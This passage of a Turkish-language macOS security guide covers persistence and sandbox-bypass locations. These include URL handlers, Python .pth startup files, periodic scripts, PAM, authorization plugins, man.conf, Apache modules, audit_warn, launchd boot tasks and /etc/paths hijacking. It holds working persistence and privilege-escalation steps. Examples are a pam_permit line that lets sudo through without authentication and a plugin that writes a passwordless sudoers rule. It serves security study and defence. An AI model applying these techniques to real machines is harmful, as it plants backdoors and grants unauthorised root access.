Start Chrome'u bu geçici hesapta başlatın ve etkinleştirme istemini gözlemleyin; kullanıcı kabul ettikten sonra uzantının kendi davranışı execution PoC'si olur. Testten sonra manifest'i kaldırın ve bu profildeki uzantıyı devre dışı bırakın veya kaldırın. Bu yol, araştırma Mac'indeki etkin Chrome profilinde **test edilmedi**. Managed-policy yolu da orada kullanılmadı.

Force-install ve External Extensions, **Chrome Web Store** uzantı kimliklerine referans verir; HMAC imzalı `Secure Preferences` profilini düzenleyerek yerel bir uzantıyı sessizce enjekte etme gibi daha alt düzey hileler ve diğer Chromium process istismarları için bkz.:

{{#ref}}
macos-security-and-privilege-escalation/macos-proces-abuse/macos-chromium-injection.md
{{#endref}}

### URL Scheme ve File-Type Handler'ları (LaunchServices)

Yazı: [Özel URL Scheme'leri Aracılığıyla Uzaktan Mac İstismarı (Objective-See)](https://objective-see.org/blog/blog_0x38.html)<sup>[[52]](#references)</sup>

- Sandbox bypass için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
  - Tetikleyici, kurbanın bir bağlantıya (ör. Chrome/Brave/Safari'de) tıklaması veya kayıtlı türde bir dosyayı açmasıdır
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Konum

- **`CFBundleURLTypes`/`CFBundleURLSchemes`** (özel URL scheme'i) veya **`CFBundleDocumentTypes`** (dosya uzantısı/UTI) bildiren bir uygulama paketinin `Info.plist` dosyası
- Kullanıcı başına geçerli varsayılanlar **`~/Library/Preferences/com.apple.LaunchServices/com.apple.launchservices.secure.plist`** (`LSHandlers` dizisi) içinde bulunabilir. URL scheme'i için varsayılanı seçmeye yönelik Apple'ın desteklenen API'si `LSSetDefaultHandlerForURLScheme`'dir; bu plist dosyasını doğrudan yazmak, belgelenmiş bir kayıt veya önbellek güncelleme yöntemi değildir.

#### Açıklama ve İstismar

Launch Services, URL scheme'i ve belge türü beyanlarını kayıtlı bir uygulamanın `Info.plist` dosyasından alır. [Apple'ın kayıt kılavuzu](https://developer.apple.com/library/archive/documentation/Carbon/Conceptual/LaunchServicesConcepts/LSCTasks/LSCTasks.html), kaydın Finder uygulamayı keşfettiğinde, önyükleme veya oturum açma sırasında ya da açık bir kayıt API'si aracılığıyla gerçekleşebileceğini belirtir; uygulamayı herhangi bir yere yazmak, kaydın hemen tetikleneceğini garanti etmez. Kayıt tamamlandıktan sonra eşleşen bir URL veya belgeyi açmak, kullanıcının varsayılan handler seçimine ve normal macOS başlatma denetimlerine bağlı olarak seçilen handler uygulamasını başlatabilir. Desteklenen `LSSetDefaultHandlerForURLScheme` API'si, kullanıcının tercih ettiği URL handler'ını değiştirir; yeni bırakılan bir uygulamanın otomatik olarak çalışmasını sağlamaz.<sup>[[52]](#references)</sup>

```bash
# Inspect known handlers without registering an app or changing defaults
/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -dump | grep -A3 "scheme:"
```

macOS 26.5.2 araştırma Mac’inde hiçbir uygulama kaydedilmedi ve hiçbir handler tercihi değiştirilmedi. Gerçek bir handler’ı test etmek için atılabilir bir kullanıcı hesabı kullanın, benzersiz bir scheme’e sahip yalnızca işaretleyici içeren bir uygulama kaydedin, URL’sini çağırın, ardından uygulamayı ve kaydını kaldırın.

Dosya uzantısı ve URL-scheme handler’larını derinlemesine listelemek/kötüye kullanmak için bkz.:

{{#ref}}
macos-security-and-privilege-escalation/macos-file-extension-apps.md
{{#endref}}

### Python başlangıç dosyaları (`.pth` / `usercustomize` / `sitecustomize`)

Açıklama: [https://docs.python.org/3/library/site.html](https://docs.python.org/3/library/site.html)<sup>[[56]](#references)</sup>

- Sandbox'ı bypass etmek için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
  - İlgili Python yorumlayıcısı, söz konusu site dizini etkin olarak başlatıldığında çalışır; tetikleyici tüm virtual environment’larda, Python derlemelerinde veya başlangıç flag’lerinde geçerli değildir
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
  - Yorumlayıcıyı başlatan süreç hangi ayrıcalıklara/TCC’ye sahipse onlarla çalışır

#### Konum

- **`$(python3 -m site --user-site)/*.pth`** (macOS framework derlemelerinde: `~/Library/Python/<X.Y>/lib/python/site-packages/`)
  - Root gerekmez (kullanıcı tarafından yazılabilir)
  - **Tetikleyici**: user site etkin olarak bu Python derlemesinin başlatılması; `site` modülü etkin site dizinlerindeki `.pth` dosyalarını işler
- **`<user-site>/usercustomize.py`**
  - Root gerekmez
  - **Tetikleyici**: user site etkin olarak başlatma (`site` tarafından otomatik içe aktarılır)
- **`<prefix>/site-packages/sitecustomize.py`** (örn. `/opt/homebrew/lib/python3.13/site-packages/` veya sistem yolları)
  - Yorumlayıcının konumuna bağlı olarak root/admin gerekebilir
  - **Tetikleyici**: bu site dizinini içeren bir yorumlayıcının başlatılması

#### Açıklama ve Exploitation

Başlangıçta Python normalde `site` modülünü içe aktarır ve etkin `site-packages` dizinlerini `.pth` dosyaları için tarar. Yol eklemenin yanı sıra, `import ` ile başlayan bir `.pth` satırı, adı geçen modül başka bir yerde hiç kullanılmasa bile Python kodunu çalıştırır. Python ayrıca `sitecustomize` modülünü ve **user site etkin olduğunda** `usercustomize` modülünü içe aktarmayı dener.<sup>[[56]](#references)</sup> Tetikleyici, değiştirilmiş dizini gören bir yorumlayıcının daha sonra başlatılmasıdır. `-S`, `site` işlemesini devre dışı bırakır; `-s`, `-I` veya `PYTHONNOUSERSITE`, **user-site** varyantlarını devre dışı bırakır. `-I` genellikle global `sitecustomize` modülünü devre dışı bırakmaz. Virtual environment’lar da user site’ı hariç tutabilir. İlgili yorumlayıcı için `python3 -m site` komutunu çalıştırın.

Aşağıdaki PoC macOS 26.5.2’de çalıştırıldı. Bu testte `PYTHONUSERBASE`, user site’ı geçici bir dizine taşır; gerçek bir user site değiştirilmez:

```python
import os, pathlib, subprocess, tempfile

with tempfile.TemporaryDirectory(prefix='ht-python-site-') as root:
    env = os.environ.copy()
    env['PYTHONUSERBASE'] = root
    env.pop('PYTHONNOUSERSITE', None)
    user_site = pathlib.Path(subprocess.check_output(
        ['python3', '-m', 'site', '--user-site'], env=env, text=True
    ).strip())
    user_site.mkdir(parents=True)
    pth_marker = pathlib.Path(root) / 'pth.marker'
    user_marker = pathlib.Path(root) / 'user.marker'
    (user_site / 'ht_probe.pth').write_text(
        'import pathlib; pathlib.Path(' + repr(str(pth_marker)) + ').touch()\n'
    )
    (user_site / 'usercustomize.py').write_text(
        'import pathlib; pathlib.Path(' + repr(str(user_marker)) + ').touch()\n'
    )
    subprocess.run(['python3', '-c', 'pass'], env=env, check=True)
    print('pth:', pth_marker.exists(), 'usercustomize:', user_marker.exists())
```

Her iki işaretleyici de göründü. Bu testte `-s`, `-I` veya `-S` ile tekrarlandığında her iki **user-site** işaretleyicisinin de görünmesi engellendi. Global bir site dizinindeki `sitecustomize` test edilmedi.

## Root Sandbox Bypass

> [!TIP]
> Burada, **root** olarak bir şeyi **dosyaya yazarak** basitçe çalıştırmanıza olanak tanıyan **sandbox bypass** için yararlı başlangıç konumlarını bulabilirsiniz ve/veya başka **alışılmadık koşullar** gerektiren konumları.

### Periodic

> [!CAUTION]
> **Tarihsel mekanizma:** macOS 26.5.2 test makinesinde `/usr/sbin/periodic`, `/etc/defaults/periodic.conf`, `/etc/periodic` ve `com.apple.periodic-*` launch daemon'ları mevcut değildir. Güncel bir sistemde `/etc/periodic` oluşturmanın içeriğini zamanlayacağını varsaymayın. Aşağıdaki örneği kullanmadan önce hedef sürümde hem komutun hem de etkin bir zamanlayıcının bulunduğunu kontrol edin.

Yazı: [https://theevilbit.github.io/beyond/beyond_0019/](https://theevilbit.github.io/beyond/beyond_0019/)<sup>[[27]](#references)</sup>

- Sandbox bypass için kullanışlı: [🟠](https://emojipedia.org/large-orange-circle)
  - Ancak root olmanız gerekir
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Konum

- `/etc/periodic/daily`, `/etc/periodic/weekly`, `/etc/periodic/monthly`, `/usr/local/etc/periodic`
  - Root gerekir
  - **Tetiklenme**: Zamanı geldiğinde
- `/etc/daily.local`, `/etc/weekly.local` veya `/etc/monthly.local`
  - Root gerekir
  - **Tetiklenme**: Zamanı geldiğinde

#### Açıklama & Exploitation

Eski sürümlerde periodic script'leri (**`/etc/periodic`**), `/System/Library/LaunchDaemons/com.apple.periodic*` konumundaki **launch daemon**'ları tarafından zamanlanıyordu. macOS Big Sur 11.5'ten itibaren periodic runner, periodic dizinlerindeki script'leri her dosyanın **sahibi** olarak çalıştırdı ve önceki bir yetki yükseltme yolunu kapattı.<sup>[[27]](#references)</sup> Aşağıdaki komutlar ve dizin listelemeleri tarihsel çıktılardır; macOS 26.5.2 üzerinde yapılan bir testin sonucu değildir.

```bash
# Launch daemons that will execute the periodic scripts
ls -l /System/Library/LaunchDaemons/com.apple.periodic*
-rw-r--r--  1 root  wheel  887 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-daily.plist
-rw-r--r--  1 root  wheel  895 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-monthly.plist
-rw-r--r--  1 root  wheel  891 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-weekly.plist

# The scripts located in their locations
ls -lR /etc/periodic
total 0
drwxr-xr-x  11 root  wheel  352 May 13 00:29 daily
drwxr-xr-x   5 root  wheel  160 May 13 00:29 monthly
drwxr-xr-x   3 root  wheel   96 May 13 00:29 weekly

/etc/periodic/daily:
total 72
-rwxr-xr-x  1 root  wheel  1642 May 13 00:29 110.clean-tmps
-rwxr-xr-x  1 root  wheel   695 May 13 00:29 130.clean-msgs
[...]

/etc/periodic/monthly:
total 24
-rwxr-xr-x  1 root  wheel   888 May 13 00:29 199.rotate-fax
-rwxr-xr-x  1 root  wheel  1010 May 13 00:29 200.accounting
-rwxr-xr-x  1 root  wheel   606 May 13 00:29 999.local

/etc/periodic/weekly:
total 8
-rwxr-xr-x  1 root  wheel  620 May 13 00:29 999.local
```

Çalıştırılacak diğer periyodik betikler **`/etc/defaults/periodic.conf`** dosyasında belirtilir:

```bash
grep "Local scripts" /etc/defaults/periodic.conf
daily_local="/etc/daily.local"				# Local scripts
weekly_local="/etc/weekly.local"			# Local scripts
monthly_local="/etc/monthly.local"			# Local scripts
```

`periodic` ve launch daemon'ları yüklü ve etkin olan eski sistemlerde `/etc/daily.local`, `/etc/weekly.local` ve `/etc/monthly.local` ek yürütme yollarıydı. Zararsız, salt okunur bir kontrol şöyledir:

```bash
test -x /usr/sbin/periodic && ls /System/Library/LaunchDaemons/com.apple.periodic-*.plist
```

> [!WARNING]
> Sahipliğe dayalı kural, doğrudan periyodik dizinlerdeki script'lere uygulanıyordu. Tarihsel `999.local` wrapper'ı, aynı sahiplik kontrolü olmadan `/etc/daily.local`, `/etc/weekly.local` veya `/etc/monthly.local` dosyalarını source ediyordu; zamanlayıcı root olarak çalıştığında bu yerel dosyalar da root olarak çalışıyordu. Bu ayrım ve Big Sur 11.5 değişikliği [orijinal araştırmada](https://theevilbit.github.io/beyond/beyond_0019/) belgelenmiştir. `periodic` yoksa bu yolların etkin olduğu varsayılmamalıdır.

### PAM

Yazı: [Linux Hacktricks PAM](../linux-hardening/software-information/pam-pluggable-authentication-modules.md)\
Yazı: [https://theevilbit.github.io/beyond/beyond_0005/](https://theevilbit.github.io/beyond/beyond_0005/)<sup>[[28]](#references)</sup>

- Sandbox'ı bypass etmek için kullanışlı: [🟠](https://emojipedia.org/large-orange-circle)
  - Ancak root olmanız gerekir
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Konum

- Her zaman root gerekir

#### Açıklama ve Exploitation

PAM, macOS içinde kolay çalıştırmadan ziyade **persistence** ve malware konularına odaklandığından bu blog ayrıntılı bir açıklama sunmayacaktır; bu tekniği daha iyi anlamak için **yazıları okuyun**.<sup>[[28]](#references)</sup>

PAM modüllerini şununla kontrol edin:

```bash
ls -l /etc/pam.d
```

PAM'i kötüye kullanan bir kalıcılık/ayrıcalık yükseltme tekniği, /etc/pam.d/sudo modülünü değiştirip başına şu satırı eklemek kadar kolaydır:

```bash
auth       sufficient     pam_permit.so
```

Yani şöyle bir şeye **benzeyecek**:

```bash
# sudo: auth account password session
auth       sufficient     pam_permit.so
auth       include        sudo_local
auth       sufficient     pam_smartcard.so
auth       required       pam_opendirectory.so
account    required       pam_permit.so
password   required       pam_deny.so
session    required       pam_permit.so
```

Ve bu nedenle **`sudo` kullanma girişimleri işe yarayacaktır**.

> [!CAUTION]
> Bu dizinin TCC tarafından korunduğunu unutmayın; kullanıcının erişim izni isteyen bir istemle karşılaşma olasılığı oldukça yüksektir.

Bir diğer iyi örnek `su`'dur; burada PAM modüllerine parametre vermenin de mümkün olduğunu görebilirsiniz (bu dosyaya arka kapı da ekleyebilirsiniz):

```bash
cat /etc/pam.d/su
# su: auth account session
auth       sufficient     pam_rootok.so
auth       required       pam_opendirectory.so
account    required       pam_group.so no_warn group=admin,wheel ruser root_only fail_safe
account    required       pam_opendirectory.so no_check_shell
password   required       pam_opendirectory.so
session    required       pam_launchd.so
```

### Yetkilendirme Eklentileri

Writeup: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)<sup>[[29]](#references)</sup>\
Writeup: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)<sup>[[30]](#references)</sup>

- Sandbox'ı atlatmak için kullanışlı: [🟠](https://emojipedia.org/large-orange-circle)
  - Ancak root olmanız ve ek yapılandırmalar yapmanız gerekir
- TCC bypass: ???

#### Konum

- `/Library/Security/SecurityAgentPlugins/`
  - Root yetkisi gerekir
  - Eklentiyi kullanacak şekilde authorization database'i yapılandırmak da gerekir

#### Açıklama ve Exploitation

Persistence sağlamak için kullanıcı oturum açtığında çalıştırılacak bir authorization plugin oluşturabilirsiniz. Bu eklentilerden birinin nasıl oluşturulacağı hakkında daha fazla bilgi için önceki writeup'lara bakın (ve dikkatli olun; iyi yazılmamış bir eklenti oturumunuzu kilitleyebilir ve Mac'inizi recovery mode üzerinden temizlemeniz gerekebilir).<sup>[[29]](#references)[[30]](#references)</sup>

```objectivec
// Compile the code and create a real bundle
// gcc -bundle -framework Foundation main.m -o CustomAuth
// mkdir -p CustomAuth.bundle/Contents/MacOS
// mv CustomAuth CustomAuth.bundle/Contents/MacOS/

#import <Foundation/Foundation.h>

__attribute__((constructor)) static void run()
{
    NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
    system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
}
```

**Taşıyın** bundle'ı yükleneceği konuma:

```bash
cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
```

Son olarak, bu Plugin'i yüklemek için **kuralı** ekleyin:

```bash
cat > /tmp/rule.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
            <key>class</key>
            <string>evaluate-mechanisms</string>
            <key>mechanisms</key>
            <array>
                <string>CustomAuth:login,privileged</string>
            </array>
        </dict>
</plist>
EOF

security authorizationdb write com.asdf.asdf < /tmp/rule.plist
```

**`evaluate-mechanisms`**, yetkilendirme framework'üne yetkilendirme için **harici bir mekanizmayı çağırması gerekeceğini** bildirir. Ayrıca **`privileged`**, mekanizmanın root tarafından çalıştırılmasını sağlar.

Şununla tetikleyin:

```bash
security authorize com.asdf.asdf
```

Ve **staff grubu sudo** erişimine sahip olmalıdır (doğrulamak için `/etc/sudoers` dosyasını okuyun).

### Man.conf

Yazı: [https://theevilbit.github.io/beyond/beyond_0030/](https://theevilbit.github.io/beyond/beyond_0030/)<sup>[[31]](#references)</sup>

- Sandbox'ı bypass etmek için kullanışlı: [🟠](https://emojipedia.org/large-orange-circle)
  - Ancak root olmanız ve kullanıcının man kullanması gerekir
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Konum

- **`/private/etc/man.conf`**
  - Root yetkisi gerekir
  - **`/private/etc/man.conf`**: man her kullanıldığında

#### Açıklama ve Exploit

**`/private/etc/man.conf`** yapılandırma dosyası, man belgeleri açılırken kullanılacak binary/script'i belirtir. Böylece, kullanıcının bazı belgeleri okumak için man'ı her kullandığında bir backdoor çalıştırılacak şekilde yürütülebilir dosyanın yolu değiştirilebilir.<sup>[[31]](#references)</sup>

Örneğin **`/private/etc/man.conf`** dosyasına şunu yazın:

```
MANPAGER /tmp/view
```

Ardından `/tmp/view`'i şu şekilde oluşturun:

```bash
#!/bin/zsh

touch /tmp/manconf

/usr/bin/less -s
```

### Apache2

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0025/](https://theevilbit.github.io/beyond/beyond_0025/)<sup>[[32]](#references)</sup>

- Sandbox'ı bypass etmek için kullanışlı: [🟠](https://emojipedia.org/large-orange-circle)
  - Ancak root olmanız ve Apache'nin çalışıyor olması gerekir
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
  - Httpd'nin entitlement'ları yoktur

#### Konum

- **`/etc/apache2/httpd.conf`**
  - Root gerekir
  - Tetikleyici: Apache2 başlatıldığında

#### Açıklama ve Exploit

`/etc/apache2/httpd.conf` dosyasında, aşağıdaki gibi bir satır ekleyerek bir modülün yüklenmesini belirtebilirsiniz:<sup>[[32]](#references)</sup>

```bash
LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
```

Bu şekilde, derlediğiniz modül Apache tarafından yüklenir. Tek yapmanız gereken, **geçerli bir Apple sertifikasıyla imzalamak** veya sisteme **yeni bir güvenilir sertifika ekleyip** modülü bu sertifikayla **imzalamaktır**.

Ardından, gerekirse sunucunun başlatıldığından emin olmak için şunu çalıştırabilirsiniz:

```bash
sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
```

Dylb için kod örneği:

```objectivec
#include <stdio.h>
#include <syslog.h>

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
     printf("[+] dylib constructor called from %s\n", argv[0]);
     syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
}
```

### BSM audit framework

Writeup: [https://theevilbit.github.io/beyond/beyond_0031/](https://theevilbit.github.io/beyond/beyond_0031/)<sup>[[33]](#references)</sup>

- Sandbox'ı bypass etmek için kullanışlı: [🟠](https://emojipedia.org/large-orange-circle)
  - Ancak root olmanız, auditd'nin çalışıyor olması ve bir uyarıya neden olmanız gerekir
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Konum

- **`/etc/security/audit_warn`**
  - Root yetkisi gerekir
  - **Tetikleyici**: auditd bir uyarı algıladığında

#### Açıklama ve Exploit

auditd bir uyarı algıladığında **`/etc/security/audit_warn`** betiği **çalıştırılır**. Bu nedenle payload'unuzu bu betiğe ekleyebilirsiniz.<sup>[[33]](#references)</sup>

```bash
echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
```

`sudo audit -n` ile bir uyarıyı zorla gösterebilirsiniz.

### Başlangıç Öğeleri

> [!CAUTION] > **Bu kullanım dışıdır; dolayısıyla bu dizinlerde hiçbir şey bulunmamalıdır.**

**StartupItem**, `/Library/StartupItems/` veya `/System/Library/StartupItems/` dizinlerinden birinde bulunması gereken bir dizindir. Bu dizin oluşturulduktan sonra iki özel dosya içermelidir:

1. Bir **rc script**: Başlangıçta çalıştırılan bir shell script.
2. Çeşitli yapılandırma ayarlarını içeren, özellikle `StartupParameters.plist` adını taşıyan bir **plist file**.

Başlangıç işleminin bu dosyaları tanıyıp kullanabilmesi için hem rc script’in hem de `StartupParameters.plist` dosyasının **StartupItem** dizinine doğru şekilde yerleştirildiğinden emin olun.

{{#tabs}}
{{#tab name="StartupParameters.plist"}}

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Description</key>
        <string>This is a description of this service</string>
    <key>OrderPreference</key>
        <string>None</string> <!--Other req services to execute before this -->
    <key>Provides</key>
    <array>
        <string>superservicename</string> <!--Name of the services provided by this file -->
    </array>
</dict>
</plist>
```

{{#endtab}}

{{#tab name="superservicename"}}

```bash
#!/bin/sh
. /etc/rc.common

StartService(){
    touch /tmp/superservicestarted
}

StopService(){
    rm /tmp/superservicestarted
}

RestartService(){
    echo "Restarting"
}

RunService "$1"
```

{{#endtab}}
{{#endtabs}}

### ~~emond~~

> [!CAUTION]
> macOS'umda bu bileşeni bulamıyorum; daha fazla bilgi için writeup'a bakın

Writeup: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)<sup>[[34]](#references)</sup>

Apple tarafından kullanıma sunulan **emond**, yeterince geliştirilmemiş veya muhtemelen terk edilmiş gibi görünen, ancak erişilebilir durumda kalan bir günlükleme mekanizmasıdır. Bir Mac yöneticisine pek fayda sağlamasa da bu belirsiz hizmet, çoğu macOS yöneticisinin fark etmeyeceği, tehdit aktörleri için gizli bir kalıcılık yöntemi olabilir.<sup>[[34]](#references)</sup>

Varlığından haberdar olanlar için **emond**'un kötü amaçlı kullanımını tespit etmek kolaydır. Bu hizmetin sistem LaunchDaemon'u, çalıştırılacak betikleri tek bir dizinde arar. Bunu incelemek için şu komut kullanılabilir:

```bash
ls -l /private/var/db/emondClients
```

### ~~XQuartz~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)<sup>[[3]](#references)</sup>

#### Konum

- **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
  - Root yetkisi gerekir
  - **Tetikleyici**: XQuartz ile

#### Açıklama ve Exploit

XQuartz **artık macOS'e yüklenmiyor**, bu nedenle daha fazla bilgi için writeup'a bakın.<sup>[[3]](#references)</sup>

### ~~kext~~

> [!CAUTION]
> Bir kext yüklemek, root yetkisiyle bile o kadar karmaşıktır ki bir exploit'iniz yoksa pratik bir sandbox-escape veya persistence tekniği olarak değerlendirilmez.

#### Konum

Bir KEXT'i başlangıç öğesi olarak yüklemek için **aşağıdaki konumlardan birine yüklenmesi gerekir**:

- `/System/Library/Extensions`
  - OS X işletim sistemine yerleşik KEXT dosyaları.
- `/Library/Extensions`
  - 3. taraf yazılımlar tarafından yüklenen KEXT dosyaları

Şu anda yüklenmiş kext dosyalarını şu komutla listeleyebilirsiniz:

```bash
kextstat #List loaded kext
kextload /path/to/kext.kext #Load a new one based on path
kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
kextunload /path/to/kext.kext
kextunload -b com.apple.driver.ExampleBundle
```

Daha fazla bilgi için [**kernel extensions bölümünü inceleyin**](macos-security-and-privilege-escalation/mac-os-architecture/index.html#i-o-kit-drivers).

### ~~amstoold~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0029/](https://theevilbit.github.io/beyond/beyond_0029/)<sup>[[35]](#references)</sup>

#### Konum

- **`/usr/local/bin/amstoold`**
  - Root gerekir

#### Açıklama ve Exploitation

Görünüşe göre `/System/Library/LaunchAgents/com.apple.amstoold.plist` içindeki `plist`, bir XPC service sunarken bu binary'yi kullanıyordu... Ancak binary mevcut değildi. Bu nedenle oraya bir şey yerleştirebilir ve XPC service çağrıldığında binary'nizin çalışmasını sağlayabilirdiniz.<sup>[[35]](#references)</sup>

Bunu artık macOS'imde bulamıyorum.

### ~~xsanctl~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0015/](https://theevilbit.github.io/beyond/beyond_0015/)<sup>[[36]](#references)</sup>

#### Konum

- **`/Library/Preferences/Xsan/.xsanrc`**
  - Root gerekir
  - **Tetikleyici**: Service çalıştırıldığında (nadiren)

#### Açıklama ve exploit

Görünüşe göre bu script'i çalıştırmak pek yaygın değil ve onu macOS'imde bile bulamadım. Daha fazla bilgi için writeup'a göz atın.<sup>[[36]](#references)</sup>

### ~~/etc/rc.common~~

> [!CAUTION] > **Bu, modern MacOS sürümlerinde çalışmıyor**

Buraya **başlangıçta çalıştırılacak komutlar** yerleştirmek de mümkündür. Normal bir rc.common script'i örneği:

```bash
#
# Common setup for startup scripts.
#
# Copyright 1998-2002 Apple Computer, Inc.
#

######################
# Configure the shell #
######################

#
# Be strict
#
#set -e
set -u

#
# Set command search path
#
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec:/System/Library/CoreServices; export PATH

#
# Set the terminal mode
#
#if [ -x /usr/bin/tset ] && [ -f /usr/share/misc/termcap ]; then
#    TERM=$(tset - -Q); export TERM
#fi

###################
# Useful functions #
###################

#
# Determine if the network is up by looking for any non-loopback
# internet network interfaces.
#
CheckForNetwork()
{
    local test

    if [ -z "${NETWORKUP:=}" ]; then
	test=$(ifconfig -a inet 2>/dev/null | sed -n -e '/127.0.0.1/d' -e '/0.0.0.0/d' -e '/inet/p' | wc -l)
	if [ "${test}" -gt 0 ]; then
	    NETWORKUP="-YES-"
	else
	    NETWORKUP="-NO-"
	fi
    fi
}

alias ConsoleMessage=echo

#
# Process management
#
GetPID ()
{
    local program="$1"
    local pidfile="${PIDFILE:=/var/run/${program}.pid}"
    local     pid=""

    if [ -f "${pidfile}" ]; then
	pid=$(head -1 "${pidfile}")
	if ! kill -0 "${pid}" 2> /dev/null; then
	    echo "Bad pid file $pidfile; deleting."
	    pid=""
	    rm -f "${pidfile}"
	fi
    fi

    if [ -n "${pid}" ]; then
	echo "${pid}"
	return 0
    else
	return 1
    fi
}

#
# Generic action handler
#
RunService ()
{
    case $1 in
      start  ) StartService   ;;
      stop   ) StopService    ;;
      restart) RestartService ;;
      *      ) echo "$0: unknown argument: $1";;
    esac
}
```

### launchd Başlangıç Görevleri

Writeup: [https://theevilbit.github.io/beyond/beyond_0034/](https://theevilbit.github.io/beyond/beyond_0034/)<sup>[[40]](#references)</sup>

- Sandbox'ı bypass etmek için kullanışlı: [🔴](https://emojipedia.org/large-red-circle) (root gerekir)
- Root gerekir; ayrıca yola bağlı olarak **SIP bypass** veya **`kTCCServiceSystemPolicySysAdminFiles`**/Full Disk Access izni gerekir

#### Konum

`launchd`, erken "boot görevlerini" açıklayan bir plist'i **`__TEXT,__config`** bölümünde barındırır. Varsayılan olarak mevcut olmayan ve bir saldırgan tarafından oluşturulabilecek çeşitli referans betikleri/ikili dosyalar:

- SIP-bypass kümesi: **`/Library/Apple/usr/libexec/finish_demo_restore`**, **`/private/var/install/shutdown_installer_tasks`**, **`/private/var/install/deferred_install`**
- TCC/FDA kümesi: **`/etc/rc.server`**, **`/etc/rc.cdrom`**, **`/etc/rc.netboot`** (`rc.netboot` yalnızca Sequoia+ sürümlerinde önceden mevcuttur)

#### Açıklama ve İstismar

`launchd`'nin hangi dosyaları çalıştıracağını ve desteklenen anahtarları (`Program`, `ProgramArguments`, `PerformAfterUserspaceReboot`, `RequireSuccess`…) görmek için gömülü görev tablosunu dökümleyin:

```bash
otool -X -s __TEXT __config /sbin/launchd | awk '{print $2 $3 $4 $5}' | \
  xxd -r -p | hexdump -v -e '1/4 "%08x"' -e '"\n"' | xxd -r -p
```

Başvurulan dosyalardan birini (ör. `/etc/rc.server`) oluşturmak, `launchd`'in bunu bir sonraki (userspace) yeniden başlatmada çalıştırmasını sağlar. En kullanışlı girdiler SIP tarafından engellenir veya TCC SysAdminFiles/Full Disk Access gerektirir; bu nedenle bu, root seviyesinde, yeniden başlatmayla tetiklenen bir tekniktir.<sup>[[40]](#references)</sup>

### ~~NVRAM (`apple-trusted-trampoline`)~~

Yazı: [https://theevilbit.github.io/beyond/beyond_0035/](https://theevilbit.github.io/beyond/beyond_0035/)<sup>[[41]](#references)</sup>

`rc.trampoline` boot görevi, önyükleme sırasında `apple-trusted-trampoline` NVRAM değişkeninde saklanan bir **platform (Apple imzalı) binary** çalıştırır; ancak **yalnızca `rc.trampoline=1` boot-arg ayarlanmışsa ve SIP devre dışıysa** (yaklaşık 390&nbsp;KB boyut sınırı ve engelleme/hızlı dönme kısıtlamasıyla). **root + SIP'nin devre dışı bırakılması + Apple imzalı bir payload** gerektirdiğinden, gerçek dünyada kalıcılık için kullanılması pratik olarak mümkün değildir ve burada yalnızca eksiksiz olması için listelenmiştir.<sup>[[41]](#references)</sup>

### /etc/paths ve /etc/paths.d (PATH hijack)

- Sandbox'ı aşmak için kullanışlı: [🔴](https://emojipedia.org/large-red-circle) (yazmak için root gerekir)
- Root gerekir

#### Konum

- **`/etc/paths`** ve **`/etc/paths.d/*`** — oturum açıldığında varsayılan `PATH`'i oluşturmak için **`path_helper`** tarafından okunur (`/etc/zprofile` içinden çağrılır).

#### Açıklama ve Exploitation

Her ikisinin de sahibi root'tur. Saldırganın kontrolündeki bir dizini başa eklemek (`/etc/paths` dosyasını düzenleyerek veya `/etc/paths.d/` içine bir dosya bırakarak), bu dizinin her yeni oturum açma kabuğunun `PATH`'inde erken sırada yer almasını sağlar. Böylece yaygın bir komutun (`ls`, `git` gibi) adıyla adlandırılmış kötü amaçlı bir binary, gerçek komutun **önüne geçer** ve kurban komutu bir sonraki çalıştırışında çalışır.

```bash
# e.g. Homebrew already ships a /etc/paths.d entry; an attacker drops their own
echo "/private/tmp/evil" | sudo tee /etc/paths.d/00-evil
# -> /private/tmp/evil is prepended to PATH for new login shells
```

### storagekitd SIP Bypass (CVE-2024-44243)

